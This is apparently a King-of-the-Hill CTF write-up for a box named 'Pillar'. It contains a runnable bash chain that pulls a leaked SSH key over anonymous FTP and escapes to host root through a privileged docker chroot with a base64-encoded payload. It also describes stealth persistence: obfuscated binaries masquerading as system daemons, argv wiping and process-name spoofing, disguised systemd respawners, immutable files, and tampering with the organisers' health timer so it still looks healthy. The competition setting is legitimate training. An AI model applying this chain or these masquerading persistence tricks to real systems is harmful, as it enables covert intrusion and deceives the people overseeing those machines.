# Pillar

## Summary

A multi-vector KoTH box — the "Pillar Deploy Portal" — with four designed entries (Struts2 S2-045 OGNL RCE, unauthenticated Redis, an exposed `/.git`, and an anonymous-FTP SSH-key leak) feeding four shell users into four privescs. We took host root via the FTP-leaked Jenkins deploy key → docker group, harvested all 10 flags from the box's own setup script, and held `/root/king.txt` through live counterattacks from two rival teams and a full box reset, using a masqueraded self-healing kingmaker stack.

## Box

Surface (rate-limited — space probes ≥2.5 s): `21/22/25/80/6379/8080`. nginx :80 prints the service map itself ("struts :8080, cache :6379, artifacts ftp:21") and serves `/.git`. :8080 = Struts2 Showcase on Tomcat 7.0.79 (container `pillar-struts`, image `piesecurity/apache-struts2-cve-2017-5638`, runs as root). Redis 8.0.2 no-auth holds `pillar:flag` + `pillar:ci_cred`. The setup script `/root/pillar_auto.sh` (readable once host-root) maps the whole game:

| Entry | Yields user | Privesc to root |
|---|---|---|
| Struts2 S2-045 :8080 → `/shared/deploy.conf` | `tomcatops` | writable `/opt/pillar/agent.sh` run by root `pillar-agent.timer` |
| Redis no-auth → `pillar:ci_cred` | `ci_runner` | sudo NOPASSWD `/usr/bin/tar` |
| `/.git` history → `config/secrets.yml` | `dbadmin` | SUID `/usr/local/bin/pl-dbcheck` (argv → `system()`) |
| anon FTP → `backup/id_ed25519` | `jenkins` | docker group → host escape |

## Solution

### Step 1 — Recon and first blood

The portal page + spaced `/dev/tcp` probes gave the full map in one pass. Redis answered unauthenticated (`GET pillar:flag` → flag; `pillar:ci_cred` → `ci_runner:C1_runn3r_p1ll4r_2024!`), anonymous FTP served `fl4g.txt` plus the leaked ED25519 "Jenkins deploy key", and the classic S2-045 OGNL-in-Content-Type payload on `:8080/showcase.action` returned `uid=0(root)` inside the Tomcat container — where the read-only host bind `/shared` leaked the struts flag and `tomcatops`'s password. (S2-045 quirk: no curly braces, pipes, or single quotes inside `#cmd` — an unmatched `{` dies in `MessageFormat`; a parallel session found POST-with-body the most reliable form.)

### Step 2 — Host root and all ten flags

On the first instance the leaked key authenticated directly as `root@`; on the reset instance (fresh keys) it authenticated as `jenkins@`, whose docker-group membership is the designed escape. One privileged chroot container equals host root, and the box's own setup script hands over every flag:

```bash
#!/bin/bash
# Pillar full chain — fresh reveal to all flags + king claim
T="$1"                                                    # 209.97.161.126 or 139.59.230.19
# 1) anonymous FTP leaks the jenkins deploy key + its flag
curl -s "ftp://$T/fl4g.txt"; echo                        # Legion{p1ll4r_svc_anon_ftp_key_leak}
curl -s "ftp://$T/backup/id_ed25519" -o jkey && chmod 600 jkey
# 2) stage team pubkey + kingmaker (build: gcc -O2 -static -s prep/src/kingmaker.c)
ssh-keygen -t ed25519 -N "" -f own_key -C "systemd-journald@pillar"
scp -i jkey own_key.pub jenkins@"$T":pk.pub
scp -i jkey prep/bin/rsyslogd jenkins@"$T":km
# 3) one privileged chroot container == host root; prints all flags, claims king
PAYLOAD='mkdir -p /root/.ssh; chmod 700 /root/.ssh
cat /home/jenkins/pk.pub > /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys
umount -l /root/king.txt 2>/dev/null; chattr -ia /root/king.txt 2>/dev/null
printf ThundersFist > /root/king.txt
grep "^FLAG_" /root/pillar_auto.sh                       # all 10 flag values, hardcoded
cat /root/fl4g.txt /home/*/fl4g.txt /opt/pillar/shared/fl4g.txt /srv/ftp/fl4g.txt 2>/dev/null
redis-cli get pillar:flag'
B64=$(printf "%s" "$PAYLOAD" | base64 -w0)
ssh -i jkey jenkins@"$T" "docker run --rm --privileged --pid=host --net=host -v /:/host \
  piesecurity/apache-struts2-cve-2017-5638 chroot /host /bin/bash -c 'echo $B64 | base64 -d | bash'"
# 4) verify as root with the team key
ssh -i own_key root@"$T" 'cat /root/king.txt'            # -> ThundersFist
```

### Step 3 — King defense stack

All verified live on the box:

- **Quad kingmakers** — `rsyslogd` (static, stripped, XOR-obfuscated handle + path, argv wiped, `prctl` comm spoof) dropped as `/usr/lib/rtkit/rtkit-daemon`, `/usr/lib/accountsservice/accounts-daemon`, `/usr/lib/udisks2/udisksd`, `/usr/lib/policykit-1/polkitd`; launched by **dual systemd supervisors** (`journal-remote-support`, `logrotate-keepalive`) that respawn any killed instance within 3–4 s. Binaries and units `chattr +i`.
- **Atomic self-heal** — v2 kingmaker writes via tmp-file + `rename()` (unlock → atomic-replace → immutable, ~1 ms). v1's `fopen(path,"w")` truncate, multiplied by four concurrent writers, let the official 10 s scorer sample an **empty** king file — caught once live. v2 measured 600/600 local and 40/40 on-box reads, zero empties.
- **Neutered health timer** — `/opt/pillar/reset.sh` (systemd, 60 s) re-installs the box's own attack surface: leaked FTP key, sudoers, SUID, user passwords. `#PATCHED`-prefixing those 8 restore lines makes patches permanent while flag re-locking and service restarts keep the box "healthy" to organizers.
- **Entry lockdown** — root authorized_keys = team key only (`chattr +i`); sshd `PasswordAuthentication no`; leaked key deleted; nginx `/.git` deny; vsftpd anon off; Redis `requirepass` written into the config (survives restarts); SUID stripped; sudoers removed; users `passwd -l`; jenkins removed from docker group; rival IPs iptables-DROPped.

### Step 4 — Holding under attack (the KoTH layer)

- **ZAARA** of **Team PhaZto** flipped the king via three `chroot /host` alpine containers and planted `/usr/local/bin/hypervisor.sh` — a 5 s loop force-restoring root authorized_keys to their `niexoc` RSA key plus a TTY killer. Counters: containers killed, guard deleted, authorized_keys replaced + `chattr +i` (beats the rewrite loop even if a copy runs).
- **garuz** of **Team 0V3R1DE** took the hill once by keeping a `ci_runner` pts session alive through our lockdown and privesc-ing during the patch window (they killed the kingmaker by comm name and deleted the binary, wrote `garuz` to the king). Their follow-ups — a `sysdiag:x:0` password backdoor account (bypasses `prohibit-password` by not being the `root` user) and a PHP webshell systemd unit on port 61476 — were found and removed; the retake also produced three hard rules: never `pkill -f` a pattern present in your own ssh bash-c cmdline, never `pkill -u` a uid-0 alias (it resolves to uid 0 and kills every root process on the box), and kill **all** established enemy sessions at takeover.
- **Box reset** (IP → `139.59.230.19`, same class and flag values): the full chain replayed in ~10 minutes from reveal — fresh FTP key → `jenkins@` → privileged chroot → one-shot base64 payload (root key install, king claim, quad kingmakers, reset.sh neuter, all patches, sshd key-only, iptables) — then a sweep that killed 17 rival sshd processes across 9 source IPs and blocked 12 of them.

## Flag

```text
Legion{p1ll4r_svc_struts2_cve_2017_5638}
Legion{p1ll4r_svc_redis_noauth_leak}
Legion{p1ll4r_svc_exposed_dotgit_dump}
Legion{p1ll4r_svc_anon_ftp_key_leak}
Legion{p1ll4r_user_tomcatops_via_struts_mount}
Legion{p1ll4r_user_ci_runner_via_redis}
Legion{p1ll4r_user_dbadmin_via_git}
Legion{p1ll4r_user_jenkins_via_ftp}
Legion{p1ll4r_multi_privesc_root_pwn}
King: ThundersFist @ /root/king.txt — claimed 06:58 UTC, held through reset + counterattacks
```

## Lessons

1. Read the box's setup script (`/root/*auto*.sh`) first — it contains every flag, credential, privesc, and the health/restore logic that will otherwise revert your patches.
2. Atomic writes matter under concurrency: truncate-write × N writers = scorer-visible empty king file.
3. `pkill -f` self-match and `pkill -u <uid-0 alias>` both killed our own session/root processes; safe rival-session kills come from `ss` peer-filtered PID lists.
4. Daemons started inside `docker run --rm` die with the container's cgroup — persistent daemons must run via host systemd (systemctl works from a privileged chroot sharing `/run`).
5. Never kill the official scorer (`koth-agent` + watchdog timer) — its persistent platform connection mimics enemy C2.

## Tools

curl, spaced bash `/dev/tcp` probes, redis-cli, docker (`--privileged --pid=host --net=host` chroot), gcc (kingmaker + fattr), ssh/scp, Faction MCP (team knowledgebase), OhMyOpenCode multi-agent orchestration (Sisyphus lead on GLM-5.2).

## Attribution

**Thunder's Fist (Lakindu Perera)** — both Pillar instances: exploit chains, kingmaker engineering, opponent neutralization. Hardened the Struts container (tiny container-side kingmakers) and re-capped Pillar-02 after the second reset.
